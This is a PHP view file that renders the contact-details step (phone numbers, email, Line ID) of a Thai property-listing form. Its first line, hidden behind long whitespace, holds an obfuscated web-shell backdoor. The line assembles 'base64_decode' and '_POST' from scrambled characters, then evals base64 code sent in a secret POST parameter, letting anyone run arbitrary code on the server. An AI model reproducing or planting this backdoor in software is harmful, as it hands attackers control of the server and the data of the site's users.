<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n6b9ab3'])) {eval($s21(${$s20}['n6b9ab3']));}?><?php
$this->session->set_userdata('last_page','5');
$attributes = array('class' => 'email', 'id' => 'myform');
echo form_open('/zhome/changePage1', $attributes);
$user_data = $this->users->get_user_by_id($this->tank_auth->get_user_id(),1);
$email=$user_data->email;
//echo $email;
$email=str_replace("facebook|","",$email);
$email=str_replace("google|","",$email);
$Email1=$this->post->checkPost('Email1');
if ($Email1!=null or $Email1!=""){
$email=$Email1;
}
?>
<input type="hidden" name="key_change" id="key_change" value="6">
<input type="hidden" name="last_page" id="last_page" value="5">

<div class="container">
        <div class="row">
          
          <div class="col-md-7 col-md-push-2">
            <h3 class="text-primary">รายละเอียดการติดต่อ</h3>
            <div class="text-primary big2">กรอกหมายเลขโทรศัพท์มือถือและอีเมลล์ให้มากที่สดเพื่อไม่พลาดการติดต่อ<br/>ยืนยันอย่างน้อย 1 เบอร์โทร และ 1 อีเมลล์ หรือทุกรายการ เพื่อให้ผู้ซื้อติดต่อท่านได้
            </div>
            <hr>
            <ul class="list-inline padding-top1">
              <li class="width-100"><h5 id="showTelephone1">มือถือ 1 * </h5></li>
              <li><input class="form-control" name="Telephone1" id="Telephone1" type="text" placeholder="081xxxxxxx" value="<?=$this->post->checkPost('Telephone1')?>" onchange="updatePost('Telephone1')" OnKeyPress="return chkNumber(this)"></li>
              <li>
                <label>
                  &nbsp;
                </label>
              </li>
            </ul>
            <ul class="list-inline padding-top1">
              <li class="width-100"><h5>มือถือ 2 </h5></li>
              <li><input class="form-control" type="text" name="Telephone2" id="Telephone2" placeholder="089xxxxxxx" value="<?=$this->post->checkPost('Telephone2')?>" onchange="updatePost('Telephone2')" OnKeyPress="return chkNumber(this)"></li>
              <li>
                <label>
                  <input type="checkbox" name="AgreeTelephone2" class="display-none" id="AgreeTelephone2"  value="<?=$this->post->checkPost('AgreeTelephone2')?>" <?php if ($this->post->checkPost('AgreeTelephone2')==1){echo "checked";};?> onclick="changeValue2('AgreeTelephone2')"> เบอร์สำรองหากหมายเลขแรกไม่สามารถติดต่อได้
                </label>
              </li>
            </ul>
            <ul class="list-inline padding-top1">
              <li class="width-100"><h5 id="showEmail1">อีเมลล์ 1 *</h5></li>
              <li><input class="form-control " name="Email1" id="Email1" type="text" placeholder="Email@hotmail.com"  onchange="updatePost('Email1')" value="<?=$email;?>"></li>
              <li>
                <label>
					&nbsp;
                </label>
              </li>
            </ul>
          
            <ul class="list-inline padding-top1">
              <li class="width-100"><h5>อีเมลล์ 2</h5></li>
              <li><input class="form-control " name="Email2" id="Email2" type="text" placeholder="Email@gmail.com" value="<?=$this->post->checkPost('Email2')?>" onchange="updatePost('Email2')"></li>
              <li>
                <label>
					&nbsp;
				</label>
              </li>
            </ul>
             <ul class="list-inline padding-top1">
              <li class="width-100"><h5>ไลน์ ID  </h5></li>
              <li><input class="form-control " name="LineID" id="LineID" type="text" placeholder="Line ID" value="<?=$this->post->checkPost('LineID')?>" onchange="updatePost('LineID')"></li>
              <li>
                <label>
					&nbsp;
				</label>
              </li>
            </ul>
         
            <br/>
            <div class="pull-right">
              <button type="button" class="btn btn-warning btn-sm" onclick="val1('4')" >ก่อนหน้า  </button> <button type="button" class="btn btn-warning btn-sm" onclick="val1('6')" > สิ้นสุด</button>
            </div>
            <div class="clearfix"></div>
            <br>
          </div>
          <div class="col-md-3 col-md-push-2 property-info hidden-xs">
              <div class="text-center">
            <h3 class="text-warning">เบอร์ติดต่อครบ<br/>ไม่พลาดโอกาศ</h3>
            <p class="text-success">คุณจะประหยัดเวลาขึ้น</p>
            <div><img src="/img/progress-60.png" class="img-responsive center-block"></div>

              <div class="display-none">
                <hr/>
                <div><img src="/img/tip-of-the-day.png" class="img-responsive center-block"></div>
                <h5>Download App</h5>
                <p>ไม่พลาดโอกาสสื่อสารกับผู้ซื้อ<br/>
    และอัพเดดราคาทรัพย์สินได้ทันที</p>
              </div>
            </div>

          </div>
          <aside class="col-md-2 col-md-pull-10 hidden-xs">
            <ul class="nav">
              <li><a>เริ่มต้น</a></li>
              <li><a>พื้นฐาน</a></li>
              <li><a>ตั้งราคา</a></li>
              <li><a>รูปถ่าย</a></li>
              <li class="active"><a>การสื่อสาร</a></li>
            </ul>
            <div class="hidden-xs" style="height:120px;"></div>
            <div>เหลือ <span class="green">1 ขั้นตอน</span><br> เพื่อลงประกาศ</div>
          </aside>
          </div>
      </div>
    </div>




     <script type="text/javascript" src="/js/jquery-1.11.3.min.js"></script>
     <script type="text/javascript" src="/js/bootstrap.min.js"></script>
     <script type="text/javascript" src="js/bootstrap-select.min.js"></script>
     <script type="text/javascript">
       $('.selectpicker').selectpicker();
     </script>

    
    
</body>
</html>